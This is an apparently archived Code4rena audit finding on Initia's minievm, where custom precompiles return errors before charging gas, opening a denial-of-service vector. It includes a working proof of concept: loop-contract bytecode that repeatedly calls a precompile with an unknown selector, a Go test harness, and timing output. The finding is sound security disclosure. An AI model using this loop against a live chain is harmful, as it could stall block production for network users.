---
tags:
  - severity/high
  - has/github
  - has/poc
  - lang/solidity
  - sector/infra
  - platform/code4rena
protocol: "[[Initia]]"
auditors:
  - berndartmueller
report: "https://code4rena.com/reports/2025-02-initia-cosmos"
genome:
  - "[[dos-resistance]]"
  - "[[dos/gas-limit]]"
  - "[[dos/temporary]]"
  - "[[known-pattern]]"
  - "[[always]]"
  - "[[add-check]]"
  - "[[blast-radius/protocol-wide]]"
---
# [H-08] Precompiles fail to charge gas in case of an error leading to a DOS vector

- id: 55311
- impact: HIGH
- protocol: Initia
- reporter: berndartmueller (Code4rena)
- source: https://code4rena.com/reports/2025-02-initia-cosmos

## Summary


This bug report discusses a potential issue with the custom precompiles in the "minievm" code. These precompiles are called using the "ExtendedRun" function and gas is charged based on the input length. However, if there is an error or the input cannot be unpacked, the precompile returns an error without charging any gas. This could lead to a denial of service attack on the network if a transaction is crafted to take a long time to execute. A proof of concept is provided to demonstrate this issue and recommended mitigation steps are to charge the input gas before returning an error. The bug report is still unmitigated and further details can be found in the reports from other reviewers.

## Details



<https://github.com/initia-labs/minievm/blob/744563dc6a642f054b4543db008df22664e4c125/x/evm/precompiles/cosmos/contract.go# L128-L139>

<https://github.com/initia-labs/minievm/blob/744563dc6a642f054b4543db008df22664e4c125/x/evm/precompiles/erc20_registry/contract.go# L74-L84>

### Finding description and impact

The custom precompiles in `minievm` are called via `ExtendedRun(..)` from the EVM.

Gas is charged based on the `input` length and a constant `GAS_PER_BYTE`. However, if either no ABI method is found or the input cannot be unpacked, the precompile returns an error in lines `84` or `89` without charging any gas.

In this case, it is possible to craft a transaction that can take a long time to execute, causing the expected block time to be exceeded and leading to a DOS vector for the network.

[`minievm:x/evm/precompiles/jsonutils/contract.go# L82-L93`](https://github.com/initia-labs/minievm/blob/744563dc6a642f054b4543db008df22664e4c125/x/evm/precompiles/jsonutils/contract.go# L82-L93)
```

55: func (e *JSONUtilsPrecompile) ExtendedRun(caller vm.ContractRef, input []byte, suppliedGas uint64, readOnly bool) (resBz []byte, usedGas uint64, err error) {
... 	// [...]
81:
82: 	method, err := e.ABI.MethodById(input)
83: 	if err != nil {
84: 		return nil, 0, types.ErrPrecompileFailed.Wrap(err.Error())
85: 	}
86:
87: 	args, err := method.Inputs.Unpack(input[4:])
88: 	if err != nil {
89: 		return nil, 0, types.ErrPrecompileFailed.Wrap(err.Error())
90: 	}
91:
92: 	// charge input gas
93: 	ctx.GasMeter().ConsumeGas(storetypes.Gas(len(input))*GAS_PER_BYTE, "input bytes")
```

According to the [Initia docs](https://docs.initia.xyz/about/omnitia-architecture/minitia-layer-2# overview), block times are planned to be 500ms.

### Proof of Concept

The following PoC demonstrates how a very simplistic loop contract (bytecode returned by `getLoopBytecode()`) repeatedly `staticcall`s the jsonutils precompile with an unknown function selector (so that it does not charge gas that is relative to the input length in line `93`) until it runs out of gas. But by doing so, the execution time is significantly greater than the charged gas can compensate for.

Considering a 30M block gas limit, the loop contract execution can take `+2s` (on a maxed-out MacBook Pro M2)!

*Please note that for simplicity, the loop contract is not regularly deployed, instead, `EVMCallWithTracer()` is modified to set the loop contract bytecode at the address `0x0200`. This does not affect the legitimacy of the PoC.*
```

diff --git a/x/evm/keeper/context.go b/x/evm/keeper/context.go
--- x/evm/keeper/context.go
+++ x/evm/keeper/context.go
@@ -272,8 +272,27 @@
 func (k Keeper) EVMCall(ctx context.Context, caller common.Address, contractAddr common.Address, inputBz []byte, value *uint256.Int, accessList coretype.AccessList) ([]byte, types.Logs, error) {
 	return k.EVMCallWithTracer(ctx, caller, contractAddr, inputBz, value, accessList, nil)
 }

+func getLoopBytecode() string {
+	/**
+	PUSH4 arbitrarySelector
+	PUSH0
+	MSTORE
+	PUSH0
+	JUMPDEST
+	PUSH0
+	PUSH1 0x20
+	PUSH1 0x1c
+	PUSH1 0xf3
+	PUSH0
+	STATICCALL
+	PUSH1 0x08
+	JUMP
+	  **/
+	return "63762ECA335F525F5B5F6020601C60F35FFA600856"
+}
+
 // EVMCallWithTracer executes an EVM call with the given input data and tracer.
 func (k Keeper) EVMCallWithTracer(ctx context.Context, caller common.Address, contractAddr common.Address, inputBz []byte, value *uint256.Int, accessList coretype.AccessList, tracer *tracing.Hooks) ([]byte, types.Logs, error) {
 	ctx, evm, err := k.CreateEVM(ctx, caller, tracer)
 	if err != nil {
@@ -285,8 +304,13 @@
 	if value == nil {
 		value = uint256.NewInt(0)
 	}

+	// deploy loop contract
+	loopBytecode := getLoopBytecode()
+	var loopAddress = common.HexToAddress("0200")
+	evm.StateDB.SetCode(loopAddress, common.Hex2Bytes(loopBytecode))
+
 	rules := evm.ChainConfig().Rules(evm.Context.BlockNumber, evm.Context.Random != nil, evm.Context.Time)
 	evm.StateDB.Prepare(rules, caller, types.NullAddress, &contractAddr, k.precompileAddrs(rules), accessList)

 	retBz, gasRemaining, err := evm.Call(
diff --git a/x/evm/keeper/context_test.go b/x/evm/keeper/context_test.go
--- x/evm/keeper/context_test.go
+++ x/evm/keeper/context_test.go
@@ -3,10 +3,12 @@
 import (
 	"fmt"
 	"strings"
 	"testing"
+	"time"

 	"cosmossdk.io/math"
+	storetypes "cosmossdk.io/store/types"
 	"github.com/ethereum/go-ethereum/common"
 	"github.com/ethereum/go-ethereum/common/hexutil"
 	"github.com/ethereum/go-ethereum/core/vm"
 	"github.com/ethereum/go-ethereum/eth/tracers/logger"
@@ -140,8 +142,36 @@
 	_, _, err = input.EVMKeeper.EVMCall(ctx, caller, contractAddr, queryInputBz, nil, nil)
 	require.ErrorContains(t, err, types.ErrReverted.Error())
 }

+func Test_Call_Audit_Precompile(t *testing.T) {
+	var loopAddress = common.HexToAddress("0200")
+
+	ctx, input := createDefaultTestInput(t)
+	_, _, addr := keyPubAddr()
+
+	caller := common.BytesToAddress(addr.Bytes())
+
+	// set custom gas meter with 30M gas limit
+	ctx = ctx.WithGasMeter(storetypes.NewGasMeter(30_000_000))
+
+	start := time.Now()
+	gasStart := ctx.GasMeter().GasConsumed()
+
+	res, logs, err := input.EVMKeeper.EVMCall(ctx, caller, loopAddress, []byte{}, nil, nil)
+
+	elapsed := time.Since(start)
+	gasUsed := ctx.GasMeter().GasConsumed() - gasStart
+
+	fmt.Printf("execution time: %s\n", elapsed)
+	fmt.Printf("gas used: %d\n", gasUsed)
+
+	require.NoError(t, err)
+	require.Empty(t, res)
+	require.Empty(t, logs)
+	require.False(t, true) // @audit forcing test to fail to display logs
+}
+
 func Test_GetHash(t *testing.T) {
 	ctx, input := createDefaultTestInput(t)
 	_, _, addr := keyPubAddr()
```

Running the test shows the execution time and gas used:
```

execution time: 2.138438458s
gas used: 30000000
```

### Recommended mitigation steps

Consider charging some kind of static gas for each such precompile call, before erroring out. Or, charge the input gas before returning the error in lines `84` or `89`.

**[beer-1 (Initia) commented](https://code4rena.com/audits/2025-02-initia-cosmos/submissions/F-135?commentParent=KAHWCToqM5f):**

> Seems go-ethereum is already charging the static cost [here](https://github.com/ethereum/go-ethereum/blob/939a804146ee347b81119b09533acbf640d48b45/params/protocol_params.go# L103). This is more related with [this issue](https://code4rena.com/evaluate/2025-02-initia-cosmos/findings/S-151).
>
> This was fixed [here](https://github.com/initia-labs/minievm/commit/7c83e01a2c6d5cfb28354f251de9897f700096e1).

**[LSDan (judge) commented](https://code4rena.com/audits/2025-02-initia-cosmos/submissions/F-135?commentParent=KAHWCToqM5f&commentChild=uizmLRhs7cY):**

> > This is more related with this issue.
>
> Agreed, per [Supreme Court decisions](https://docs.code4rena.com/awarding/judging-criteria/supreme-court-decisions-fall-2023# verdict-similar-exploits-under-a-single-issue).

**[berndartmueller (warden) commented](https://code4rena.com/audits/2025-02-initia-cosmos/submissions/F-135?commentParent=VzAYo3cVYPQ):**

> While this submission and [S-151](https://code4rena.com/evaluate/2025-02-initia-cosmos/submissions/S-151) are both talking about gas consumption issues, the submission here is unrelated. Considering that the provided fix mitigates S-151, it would not fix this issue here.
>
> Here, it’s basically that consuming gas in L93 (`ctx.GasMeter().ConsumeGas(storetypes.Gas(len(input))*GAS_PER_BYTE, "input bytes")`) is done after:
>
> * Calling `MethodById()`, which looks up a method by the 4-byte selector.
> * Calling `Unpack()`, which unmarshals the `[]byte` input into the corresponding `args` interface (e.g., `MergeJSONArguments`).
>
> Both calls can error, in which the precompile returns early without charging the input gas.
>
> > Seems go-ethereum is already charging the static cost [here](https://github.com/ethereum/go-ethereum/blob/939a804146ee347b81119b09533acbf640d48b45/params/protocol_params.go# L103).
>
> [`CallGasEIP150 = 700`](https://github.com/ethereum/go-ethereum/blob/939a804146ee347b81119b09533acbf640d48b45/params/protocol_params.go# L103) is not actually charged. Since [EIP-2929](https://eips.ethereum.org/EIPS/eip-2929), `WARM_STORAGE_READ_COST = 100` is charged for warm (repeated) `STATICCALL` (and others).
>
> Logging the gas cost for each `STATICCALL` iteration in the loop contract reveals that it costs 125 gas each round.
>
> As seen in the PoC, it results in a potentially long-running tx execution (`~2.13s`). The static (constant) gas cost seems insufficient to prevent such scenarios.
>
> Overall, I recommend following my recommendation to charge the input gas in the precompile before erroring. I would also appreciate if the judge could re-evaluate the duplication and eventually consider it a separate finding.

**[LSDan (judge) commented](https://code4rena.com/audits/2025-02-initia-cosmos/submissions/F-135?commentParent=VzAYo3cVYPQ&commentChild=VqtCMbRF3Ve):**

> Thanks for the clarification. I agree that this makes sense as a separate issue.

**[Initia mitigated](https://github.com/code-423n4/2025-03-initia-cosmos-mitigation?tab=readme-ov-file# mitigation-of-high--medium-severity-issues):**

> Changed to return exact error only at `simulate` or `checktx`.

**Status:** Unmitigated. Full details in reports from [berndartmueller](https://code4rena.com/audits/2025-03-initia-cosmos-mitigation-review/submissions/S-25), [0xAlix2](https://code4rena.com/audits/2025-03-initia-cosmos-mitigation-review/submissions/S-20) and [Franfran](https://code4rena.com/audits/2025-03-initia-cosmos-mitigation-review/submissions/S-48), and also included in the [Mitigation Review](# mitigation-review) section below.

---


